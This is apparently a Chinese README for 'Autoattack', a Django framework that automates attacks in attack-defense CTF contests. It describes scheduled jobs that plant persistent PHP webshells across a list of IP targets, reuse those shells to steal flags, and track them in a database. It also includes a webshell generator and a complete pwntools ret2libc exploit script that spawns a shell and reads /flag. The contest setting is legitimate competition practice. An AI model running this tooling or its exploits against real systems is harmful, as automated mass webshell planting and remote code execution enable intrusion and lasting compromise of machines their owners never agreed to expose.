1. [Autoattack](#)
    1. [Features](#)
    2. [Install：](#)
    3. [配置数据库：](#)
    4. [配置 superuser：](#)
    5. [运行](#)
    6. [Usage](#)
        1. [假想环境：](#)
        2. [配置 ip 列表](#)
        3. [直接攻击，获取 flag](#)
        4. [写 webshell](#)
        5. [通过 webshell 进行攻击](#)
        6. [配置定时任务](#)
        7. [登录网站后台](#)
    7. [关于 `awdframework` 下的模块](#)
        1. [`awdframework/awd.py`](#)
        2. [`awdframework/django_job.py`](#)
        3. [`awdframework/webshell.py`](#)
        4. [`awdframework/encoder.py`](#)
    8. [如果是 pwn](#)
    9. [多道题怎么写](#)
    10. [参考资料](#)
	
# Autoattack

Autoattack ，一个追求可视化和少代码的 awd 批量攻击框架，采用 django + mysql 开发。

```shell
    ___         __              __  __             __  
   /   | __  __/ /_____  ____ _/ /_/ /_____ ______/ /__
  / /| |/ / / / __/ __ \/ __ `/ __/ __/ __ `/ ___/ //_/
 / ___ / /_/ / /_/ /_/ / /_/ / /_/ /_/ /_/ / /__/ ,<   
/_/  |_\__,_/\__/\____/\__,_/\__/\__/\__,_/\___/_/|_|

										Author: 1nhann
										
Watching for file changes with StatReloader
No changes detected
Operations to perform:
  Apply all migrations: admin, auth, contenttypes, django_apscheduler, inhann, sessions
Running migrations:
  No migrations to apply.
Admin account has already been initialized.
System check identified no issues (0 silenced).
June 01, 2022 - 12:12:12
Django version 3.2.13, using settings 'autoattack.settings'
Starting development server at http://127.0.0.1:8000/
Quit the server with CTRL-BREAK.
```



## Features

1. 定时任务。主要用于定时运行 exp，可以通过 web 后台可视化管理
2. 批量运行 exp。对指定的 ip 列表，批量运行 exp、可以做到写 webshell、访问 webshell 等
3. 记录 webshell 信息。用 mysql 数记录 webshell 信息，并实时更新，可以通过后台查看各个靶机对应的webshell 的具体信息、存活情况等
5. webshell生成模块。开发了一个简单的webshell生成模块，可以方便生成普通一句话木马、不死马等

## Install：

python 3.9+

```shell
git clone https://github.com/1nhann/Autoattack.git
```

```shell
pip install -r requirements.txt
```

## 配置数据库：

> 使用 mysql而不是 sqlite ，是因为 sqlite 性能不够高，无法招架频繁的数据库操作

1. 首先要在 mysql 中手动创建一个database ，名为 `autoattack` ，charset 使用 utf8

2. 然后修改 `settings.py` ：

```python
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',  # 数据库引擎
        'NAME': 'autoattack',  # 数据库名，事先创建
        'USER': 'root',  # 数据库用户名
        'PASSWORD': 'password',  # 密码
        'HOST': '127.0.0.1',  # mysql服务所在的主机ip
        'PORT': '3306',  # mysql服务端口
    }
}
```



## 配置 superuser：

在 `settings.py` 中配置：

```python
ADMIN_USERNAME = "admin"
ADMIN_EMAIL = "root@inhann.top"
ADMIN_PASSWORD = "admin"
```

## 运行

```shell
python manage.py runserver
```

## Usage

> 这里介绍下 example 目录下的代码

### 假想环境：

`http://ant.com/eval.php` ：

```php
<?php eval($_REQUEST["code"]);?>
```

靶机的 flag 在 `/flag`



### 配置 ip 列表

首先要配置 ip 列表，将所有要打的 ip 写到 `ip.txt` 中：

```
ant.com
192.168.56.101
```



### 直接攻击，获取 flag

`inhann/example/exp.py` 这个 demo 用来直接攻击网站获取 flag

核心逻辑在于继承 `AwdTask` ，override 一个 `exp()` ，然后把这个类作为参数送到 `Attack` 的构造函数里面

然后只要调用 `attacker.attack()` ，就能完成批量的攻击



### 写 webshell

`inhann/example/write_webshell.py` 这个 demo 用来写webshell

继承了  `AwdTask` ，override 一个 `write_webshell()` 

通过 `PHP` 类，生成用来写 webshell 的代码，然后执行这个代码

通过调用 `Example.update_and_test_available()` 方法，可以将 webshell 的相关信息写到数据库里面，并判断这个 webshell 是否能成功访问



### 通过 webshell 进行攻击

`inhann/example/get_flag.py` 这个demo 用来通过 webshell 获取 flag

继承了  `AwdTask` ，override 一个 `attack_use_webshell()` 

直接调用 `Example.test_available_and_eval()` ，传入要打的 ip 和 执行的代码，这个函数会测试 webshell 是否可以访问，如果可以访问就会去执行 php 代码



### 配置定时任务

在 `/urls.py` 的 `jobs` 中添加要定时运行的函数（解除注释就行）

比如每分钟都 传一次 webshell ，并且通过 webshell 得到 flag ：

```python
from awdframework.django_job import Scheduler
scheduler = Scheduler()
scheduler.start()

# import inhann.example.exp
import inhann.example.write_webshell
import inhann.example.get_flag

jobs = [
    # (inhann.example.exp.attacker.attack,"example.exp"),
    (inhann.example.write_webshell.attacker.attack,"example.webshell"),
    (inhann.example.get_flag.attacker.attack,"example.getflag"),
]
jobs += [

]
scheduler.add_jobs(jobs,minutes=1)
```

`(inhann.example.write_webshell.attacker.attack,"example.webshell"),` 表示把 `inhann.example.write_webshell.attacker.attack` 这个函数加入定时任务当中，id 是 `example.webshell`

`minutes=1` 表示 `jobs` 里面的函数每 1 分钟执行一次



### 登录网站后台

访问 `http://127.0.0.1:8000/`

登录之后的页面：

![image-20220603000630482](https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2022/06/image-20220603000630482.png)





可以图形化管理要定时运行的任务（删除 job 这个选项暂时没用，对于想要删除的 job ，直接在 `urls.py` 的 `jobs` 中注释掉就行）：

![image-20220603000922360](https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2022/06/image-20220603000922360.png)



每次写完 webshell 之后，webshell 的相关信息都会更新：

![image-20220603000950911](https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2022/06/image-20220603000950911.png)

如果 webshell 没法访问，也能看到报错信息：

![image-20220603001045905](https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2022/06/image-20220603001045905.png)



## 关于 `awdframework` 下的模块

> 主要是为了支持快速批量打、方便生成 webshell 、方便 django 的开发而写的

### `awdframework/awd.py` 

`awdframework/awd.py` 主要实现了批量攻击的功能，其底层逻辑是多线程

继承 `AwdTask` 类，覆写其 `exp()` 、`write_webshell()` 、`attack_use_webshell()` 等方法，然后把这个类作为参数传入 `Attacker` 的构造方法中，调用 `attacker.attack()` 就能攻击





### `awdframework/django_job.py`

`awdframework/django_job.py` 主要是为了方便 django 的开发而写的 

定义了一个 `WebshellModel` 抽象 model ，用来存储 webshell 相关信息

定义了一个 `Scheduler` ，用来做定时任务

| methods in WebshellModel  | details                                           |
| ------------------------- | ------------------------------------------------- |
| eval                      | 通过ip对应的webshell,执行php代码                  |
| test_available_and_eval   | 先判断webshell是否可以访问,然后再运行代码         |
| test_available            | 判断webshell是否可以访问                          |
| update_and_test_available | 更新、添加webshell信息,并判断这个webshell能否访问 |
| webshell_message          | 返回webshell信息                                  |
| update                    | 更新或添加webshell信息到数据库                    |
| register                  | 将model注册到admin后台,不注册后台看不到           |
| ...                       | ...                                               |
| ...                       | ...                                               |



### `awdframework/webshell.py`

`awdframework/webshell.py` 用来生成 webshell

| methods in PHP      | details                                                      |
| ------------------- | ------------------------------------------------------------ |
| generate            | 最基本的，生成一句话木马的php文件                            |
| nodiephp            | 生成一个写 不死马的 php 文件，触发后就能写入不死马           |
| fatter              | 让webshell的体积变大                                         |
| code_to_write       | 生成调用了 file_put_contents 写webshell的 php 代码，用来传入 eval() |
| code_to_write_nodie | 生成调用了 file_put_contents 写不死webshell 的 php 代码，用来传入 eval() |
| password            | 给一个 webshell 增加密码                                     |
| rawcode             | 提取一个webshell的php代码                                    |
| ...                 | ...                                                          |
| ...                 | ...                                                          |



### `awdframework/encoder.py`

工具类，用来更方便地 encode 和 decode 



## 如果是 pwn

pwn 的话不用写 webshell ，因此只需要参考 `直接攻击，获取 flag` ，配置定时运行直接攻击的脚本就行

比如：

`inhann/example/pwn.py` ：

```python
from awdframework.awd import Attack,AwdTask
from os.path import dirname
import pwn
from LibcSearcher import LibcSearcher

class Exp(AwdTask):
    def __init__(self, ips, port=80):
        super().__init__(ips, port)

    def exp(self, ip):
        sh = pwn.remote(ip, self.port)
        pwn.context.arch = "i386"
        payload = pwn.flat(chr(0) * (0x2c - 0x25), 0x80)
        sh.sendline(payload)
        e = pwn.ELF("/home/inhann/ctf")
        write_got = e.got["write"]
        write_plt = e.plt["write"]
        # main_addr = e.symbols["main"]
        main_addr = 0x08048825

        payload = pwn.flat(chr(0) * (0xe7 + 4), write_plt, main_addr, 1, write_got, 4)
        sh.sendline(payload)
        sh.recvuntil("Correct\n")
        write_addr = pwn.u32(sh.recv(4))
        libc = LibcSearcher("write", write_addr)
        libc_base = write_addr - libc.dump("write")
        system_addr = libc_base + libc.dump("system")
        bin_sh_addr = libc_base + libc.dump("str_bin_sh")

        payload = pwn.flat(chr(0) * (0x2c - 0x25), 0x80)
        sh.sendline(payload)

        payload = pwn.flat(chr(0) * (0xe7 + 4), system_addr, 0xdeadbeef, bin_sh_addr)
        sh.recvuntil("Correct\n")
        sh.sendline(payload)

        # 本来是 interactive，现在直接执行命令
        # sh.interactive()
        sh.sendline(b"cat /flag")
        result = sh.recvall()
        print(result)


attacker = Attack(f"{dirname(__file__)}\..\..\ip.txt",Exp,port=27782,thread_num=5)
attacker.attack()
```



然后把这个 attcker 的 attack 方法，添加到 `urls.py` 里面：


```python
from awdframework.django_job import Scheduler
scheduler = Scheduler()
scheduler.start()

# import inhann.example.exp
# import inhann.example.write_webshell
# import inhann.example.get_flag
import inhann.example.pwn

jobs = [
    # (inhann.example.exp.attacker.attack,"example.exp"),
    # (inhann.example.write_webshell.attacker.attack,"example.webshell"),
    # (inhann.example.get_flag.attacker.attack,"web1.getflag"),
    (inhann.example.pwn.attacker.attack,"pwn1.exp"),
]

jobs += [

]
scheduler.add_jobs(jobs,minutes=1)
```



## 多道题怎么写

参考 `example` 目录，再创建一个新目录就行

比如说，如果要打 web2 这个题目，就建立一个 `web2` 目录，然后为了记录 webshell 信息，还要在 `models.py` 里面添加一个 model （继承 `WebshellModel` ，并且定义完了要 `Web2.register()` ）：
awdframework

```python
from myframework.django_job import WebshellModel

class Example(WebshellModel):
    pass
Example.register()

class Web2(WebshellModel):
    pass
Web2.register()
```

这样一个记录 webshell 的表就创好了：

![image-20220603114131283](https://raw.githubusercontent.com/1nhann/hub/master/data/blog/2022/06/image-20220603114131283.png)



## 参考资料

https://github.com/jcass77/django-apscheduler

















